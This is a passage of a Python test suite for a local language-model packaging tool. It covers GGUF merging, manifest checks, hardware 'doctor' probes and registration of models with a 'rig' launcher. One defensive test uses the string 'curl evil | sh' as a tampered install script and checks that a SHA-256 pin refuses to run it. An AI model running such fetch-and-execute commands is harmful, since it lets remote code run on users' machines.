        self.assertEqual(names["big"][3] % 4096, {t[0]: t for t in base}["big"][3] % 4096)  # cloneable
        self.assertTrue(os.path.islink(f"{out}/m-00002-of-00002.gguf"))  # nothing replaced: linked
        with self.assertRaises(SystemExit):  # dims the base's or refused
            self.gguf(f"{d}/bad.gguf", [("a", [32], 0, os.urandom(128))])
            A.main.__globals__["sys"].argv = ["x", f"{d}/m-00001-of-00002.gguf", os.path.join(d, "out2"), f"{d}/bad.gguf"]
            try:
                A.main()
            except AssertionError as e:
                raise SystemExit(str(e))


class Quality(unittest.TestCase):
    """a pack's quality (0.6.6's KL against the reference): optional, two non-negative numbers when given"""

    def test_quality(self):
        m = manifest.load(os.path.join(os.path.dirname(os.path.abspath(__file__)), "packs.json"))
        self.assertIn("wiki_kld", m["packs"]["ud-iq2_xxs"]["quality"])
        for bad in ({"wiki_kld": -1}, {"wiki_kld": "x"}, {"perplexity": 2.0}, [0.1], {"agent_kld": True}):
            m2 = json.loads(json.dumps(m))
            m2["packs"]["ud-iq2_xxs"]["quality"] = bad
            with self.assertRaises(manifest.ManifestError):
                manifest.check(m2)
        m2 = json.loads(json.dumps(m))
        del m2["packs"]["ud-iq2_xxs"]["quality"]
        manifest.check(m2)  # optional


class Doctor(unittest.TestCase):
    """--doctor's checks on fake machines: each level and what it names"""

    def file(self, root, rel, text):
        p = os.path.join(root, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w") as f:
            f.write(text)
        return p

    def test_power(self):
        root = tempfile.mkdtemp()
        self.assertEqual(doctor.power(root)[0], doctor.NOTE)  # no profile to read
        self.file(root, "firmware/acpi/platform_profile_choices", "low-power balanced performance\n")
        for now, level in (("balanced", doctor.NOTE), ("performance", doctor.OK), ("low-power", doctor.OK)):
            self.file(root, "firmware/acpi/platform_profile", now + "\n")
            level_now, why = doctor.power(root)
            self.assertEqual(level_now, level, why)
        self.file(root, "firmware/acpi/platform_profile", "balanced\n")
        self.assertIn("performance", doctor.power(root)[1])

    def test_tmp(self):
        root = tempfile.mkdtemp()
        mounts = self.file(root, "mounts", "/dev/nvme0n1p2 / btrfs rw 0 0\ntmpfs /tmp tmpfs rw 0 0\n")
        self.assertEqual(doctor.tmp("/tmp", mounts, used=1 << 30)[0], doctor.OK)
        level, why = doctor.tmp("/tmp", mounts, used=20 << 30)
        self.assertEqual(level, doctor.NOTE)
        self.assertIn("20.0 GiB", why)
        disk = self.file(root, "mounts2", "/dev/nvme0n1p2 / ext4 rw 0 0\n")
        self.assertEqual(doctor.tmp("/tmp", disk, used=20 << 30)[0], doctor.OK)  # on disk: not RAM

    def test_memory(self):
        root = tempfile.mkdtemp()
        big = self.file(root, "a", "MemTotal:       131072000 kB\nMemAvailable:   120000000 kB\n")
        small = self.file(root, "b", "MemTotal:       65536000 kB\nMemAvailable:   60000000 kB\n")
        self.assertEqual(doctor.memory(big)[0], doctor.OK)
        self.assertEqual(doctor.memory(small)[0], doctor.NOTE)
        self.assertEqual(doctor.memory(os.path.join(root, "none"))[0], doctor.NOTE)

    def test_network(self):
        root = tempfile.mkdtemp()
        head = "Iface\tDestination\tGateway\n"
        wifi = self.file(root, "a", head + "wlp192s0\t00000000\t0100A8C0\n")
        wire = self.file(root, "b", head + "enp191s0\t00000000\t0100A8C0\nwlp192s0\t0000A8C0\t00000000\n")
        none = self.file(root, "c", head)
        self.assertEqual(doctor.network(wifi)[0], doctor.NOTE)
        self.assertIn("wlp192s0", doctor.network(wifi)[1])
        self.assertEqual(doctor.network(wire)[0], doctor.OK)
        self.assertIn("no default route", doctor.network(none)[1])

    def test_ssd(self):
        root = tempfile.mkdtemp()
        mounts = self.file(root, "mounts", "/dev/sda1 / ext4 rw 0 0\n")
        sysr = os.path.join(root, "sys")
        os.makedirs(os.path.join(sysr, "block", "sda", "sda1"))
        os.makedirs(os.path.join(sysr, "class", "block"))
        os.symlink(os.path.join(sysr, "block", "sda", "sda1"), os.path.join(sysr, "class", "block", "sda1"))
        for rot, level in (("1", doctor.FAIL), ("0", doctor.OK)):
            self.file(sysr, "block/sda/queue/rotational", rot + "\n")
            level_now, why = doctor.ssd("/", mounts, sysr)
            self.assertEqual(level_now, level, why)

    def test_direct(self):
        d = tempfile.mkdtemp()
        level, why = doctor.direct(d)
        self.assertIn(level, (doctor.OK, doctor.FAIL), why)  # the test machine's filesystem: whichever it is
        self.assertEqual(os.listdir(d), [])  # the probe removed
        self.assertEqual(doctor.direct(os.path.join(d, "missing"))[0], doctor.NOTE)
        real = os.open
        def refuse(p, flags, *a):  # noqa: E306
            if flags & getattr(os, "O_DIRECT", 0):
                raise OSError(22, "Invalid argument")
            return real(p, flags, *a)
        with mock.patch("os.open", refuse):
            level, why = doctor.direct(d)
        self.assertEqual(level, doctor.FAIL)
        self.assertIn("O_DIRECT", why)
        self.assertEqual(os.listdir(d), [])

    def test_rocm(self):
        root = tempfile.mkdtemp()
        h = self.file(root, "rocm_version.h", "#define ROCM_VERSION_MAJOR   7\n#define ROCM_VERSION_MINOR   2\n"
                                              "#define ROCM_VERSION_PATCH   1\n")
        self.assertEqual(doctor.rocm_version(h), "7.2.1")
        self.assertIsNone(doctor.rocm_version(os.path.join(root, "none")))


class Rig(unittest.TestCase):
    CFG = {"pack": "ud-iq1_s", "model": "/m/ud-iq1_s/M-00001-of-00005.gguf", "max_context": 1048576}
    PACKS = manifest.load(REAL)["packs"]
    DS = PACKS["ud-iq1_s"]["rig"]

    PIN = {"repo": "mrsirg97-rgb/rig", "version": "v3.5.0", "install_sha256": hashlib.sha256(b"echo hi\n").hexdigest()}

    def test_ensure_leaves_a_rig_alone(self):
        ran = []
        self.assertEqual(rig.ensure(self.PIN, lambda: "/usr/bin/rig", lambda url: self.fail(url),
                                    lambda script, env: ran.append(env)), "/usr/bin/rig")
        self.assertEqual(ran, [])

    def test_ensure_installs_the_pinned_rig(self):
        found = iter([None, "/home/u/.local/bin/rig"])
        got, ran = [], []
        exe = rig.ensure(self.PIN, lambda: next(found), lambda url: got.append(url) or b"echo hi\n",
                         lambda script, env: ran.append((script, env)))
        self.assertEqual(exe, "/home/u/.local/bin/rig")
        self.assertEqual(got, ["https://raw.githubusercontent.com/mrsirg97-rgb/rig/v3.5.0/install.sh"])
        self.assertEqual(ran[0][0], b"echo hi\n")
        self.assertEqual(ran[0][1]["RIG_VERSION"], "v3.5.0")                     # its binary the pinned release's

    def test_ensure_refuses_a_script_not_the_pinned_one(self):
        ran = []
        with self.assertRaisesRegex(rig.RigError, "SHA-256"):
            rig.ensure(self.PIN, lambda: None, lambda url: b"curl evil | sh\n", lambda s, e: ran.append(s))
        self.assertEqual(ran, [])                                                   # never run

    def test_ensure_refuses_an_install_that_left_no_rig(self):
        with self.assertRaisesRegex(rig.RigError, "no rig"):
            rig.ensure(self.PIN, lambda: None, lambda url: b"echo hi\n", lambda s, e: None)

    def test_window_under_the_reply_refused(self):
        with tempfile.TemporaryDirectory() as home:                   # rig refuses reserve >= window: refused first
            with self.assertRaises(rig.RigError):
                rig.register(home, dict(self.CFG, max_context=65536), "/b/osmos-api", "/m/osmos.json", default=False, row=self.DS)
            self.assertFalse(os.path.exists(os.path.join(home, "models.json")))

    def test_row_added_others_kept(self):
        with tempfile.TemporaryDirectory() as home:
            theirs = [{"id": "local", "window": 32768, "maxTokens": 4096, "reserve": 4096, "keepRecent": 8192,
                       "command": "llama-server --port ${PORT}", "port": 8090}]
            with open(os.path.join(home, "models.json"), "w") as f:
                json.dump(theirs, f)
            row = rig.register(home, self.CFG, "/opt/osmos/bin/osmos-api", "/m/ud-iq1_s/osmos.json", default=False,
                               row=self.DS)
            with open(os.path.join(home, "models.json")) as f:
                rows = json.load(f)
            self.assertEqual(rows[0], theirs[0])                          # theirs, as it was
            self.assertEqual(rows[1], row)
            self.assertEqual(row["id"], "deepseek-1017-ud-s")
            self.assertIn("${PORT}", row["command"])
            self.assertEqual(row["efforts"], ["low", "high", "max"])      # the levels osmos-api maps
            self.assertEqual(row["effort"], "max")                           # the default: the most thinking
            self.assertIn(row["effort"], row["efforts"])                     # rig refuses one not among them
            self.assertEqual((row["maxTokens"], row["reserve"]), (262144, 262144))  # a 256K thinking budget
            self.assertTrue(row["port"] != 8090 and row["window"] == 1048576)
            self.assertFalse(os.path.exists(os.path.join(home, "settings.json")))
            again = rig.register(home, self.CFG, "/opt/osmos/bin/osmos-api", "/m/ud-iq1_s/osmos.json", default=False,
                               row=self.DS)
            with open(os.path.join(home, "models.json")) as f:
                self.assertEqual(len(json.load(f)), 2)                    # its own row replaced, not doubled
            self.assertEqual(again["port"], row["port"])

    def test_qwen_row(self):
        with tempfile.TemporaryDirectory() as home:          # its 262K window, a 64K reply, its own efforts and alias
            cfg = {"pack": "qwen38-ud-iq3_xxs", "model": "/m/q/Q-00001-of-00004.gguf", "max_context": 262144}
            row = rig.register(home, cfg, "/b/osmos-api", "/m/q/osmos.json", default=False,
                               row=self.PACKS["qwen38-ud-iq3_xxs"]["rig"])
            self.assertEqual((row["id"], row["window"], row["maxTokens"], row["reserve"], row["keepRecent"]),
                             ("qwen3.8-flash-next", 262144, 65536, 65536, 65536))
            self.assertEqual((row["efforts"], row["effort"], row["aliases"]), (["low", "medium", "xhigh"], "xhigh",
                                                                               ["qwen"]))
            with self.assertRaises(rig.RigError):             # the DeepSeek packs' 256K reply in a 262K window
                rig.register(home, cfg, "/b/osmos-api", "/m/q/osmos.json", default=False, row=self.DS)

    def test_qwen_1m_row(self):
        with tempfile.TemporaryDirectory() as home:          # a million positions, the card's 256K of reasoning a turn
            cfg = {"pack": "qwen38-ud-iq3_xxs-1m", "model": "/m/q/Q-00001-of-00004.gguf", "max_context": 1048576}
            row = rig.register(home, cfg, "/b/osmos-api", "/m/q1m/osmos.json", default=False,
                               row=self.PACKS["qwen38-ud-iq3_xxs-1m"]["rig"])
            self.assertEqual((row["window"], row["maxTokens"], row["reserve"], row["aliases"]),
                             (1048576, 262144, 262144, ["qwen-1m"]))

    def test_default_when_asked(self):
        with tempfile.TemporaryDirectory() as home:
            with open(os.path.join(home, "settings.json"), "w") as f:
                json.dump({"model": "local", "theme": "dark"}, f)
            rig.register(home, self.CFG, "/b/osmos-api", "/m/osmos.json", default=True, row=self.DS)
            with open(os.path.join(home, "settings.json")) as f:
                s = json.load(f)
            self.assertEqual(s, {"model": "deepseek-1017-ud-s", "theme": "dark"})

    def test_each_packs_id(self):                        # rig's names: the model, its date, the quant's size
        ids = {pid: p["rig"]["id"] for pid, p in self.PACKS.items()}
        self.assertEqual(ids, {"osmos-evo-a": "deepseek-1017-evo-a", "ud-iq1_s": "deepseek-1017-ud-s",
                               "ud-iq1_m": "deepseek-1017-ud-m",
                               "ud-iq2_xxs": "deepseek-1017-ud-l", "qwen38-ud-iq3_xxs": "qwen3.8-flash-next",
                               "qwen38-ud-iq3_xxs-1m": "qwen3.8-flash-next-1m", "qwen38-ud-q4_k_xl": "qwen3.8-flash-next-l"})
        aliases = [a for p in self.PACKS.values() for a in p["rig"]["aliases"]]
        self.assertEqual(len(aliases), len(set(aliases)))  # no alias two rows'

    def test_the_old_row_moved(self):                    # 0.5.8's id, osmos-<pack>: replaced, its port and default kept
        with tempfile.TemporaryDirectory() as home:
            theirs = {"id": "local", "window": 32768, "maxTokens": 4096, "reserve": 4096, "keepRecent": 8192,
                      "command": "llama-server --port ${PORT}", "port": 8090}
            old = dict(theirs, id="osmos-ud-iq1_s", port=8095)
            put(os.path.join(home, "models.json"), json.dumps([theirs, old]).encode())
            put(os.path.join(home, "settings.json"), json.dumps({"model": "osmos-ud-iq1_s", "theme": "dark"}).encode())
            row = rig.register(home, self.CFG, "/b/osmos-api", "/m/osmos.json", default=False, row=self.DS)
            with open(os.path.join(home, "models.json")) as f:
                rows = json.load(f)
            self.assertEqual([r["id"] for r in rows], ["local", "deepseek-1017-ud-s"])
            self.assertEqual(rows[0], theirs)
            self.assertEqual(row["port"], 8095)
            with open(os.path.join(home, "settings.json")) as f:
                self.assertEqual(json.load(f), {"model": "deepseek-1017-ud-s", "theme": "dark"})

    def test_a_default_not_ours_kept(self):              # not asked, not the old row: settings.json untouched
        with tempfile.TemporaryDirectory() as home:
            s = os.path.join(home, "settings.json")
            put(s, b'{"model": "local"}')
            rig.register(home, self.CFG, "/b/osmos-api", "/m/osmos.json", default=False, row=self.DS)
            with open(s, "rb") as f:
                self.assertEqual(f.read(), b'{"model": "local"}')

    def test_ids_checked(self):                          # a pack's id rig's name for it: present, rig-safe, its own
        for bad in (None, "", "Has Space", "osmos/x"):
            m = manifest.load(REAL)
            m["packs"]["ud-iq1_s"]["rig"]["id"] = bad
            with self.assertRaisesRegex(manifest.ManifestError, "rig id"):
                manifest.check(m)
        m = manifest.load(REAL)
        m["packs"]["ud-iq1_m"]["rig"]["id"] = m["packs"]["ud-iq1_s"]["rig"]["id"]
        with self.assertRaisesRegex(manifest.ManifestError, "rig id"):
            manifest.check(m)

    def test_malformed_refused_untouched(self):
        with tempfile.TemporaryDirectory() as home:
            p = os.path.join(home, "models.json")
            put(p, b"[{not json")
            with self.assertRaises(rig.RigError):
                rig.register(home, self.CFG, "/b/osmos-api", "/m/osmos.json", default=False, row=self.DS)
            with open(p, "rb") as f:
                self.assertEqual(f.read(), b"[{not json")


if __name__ == "__main__":
    unittest.main()
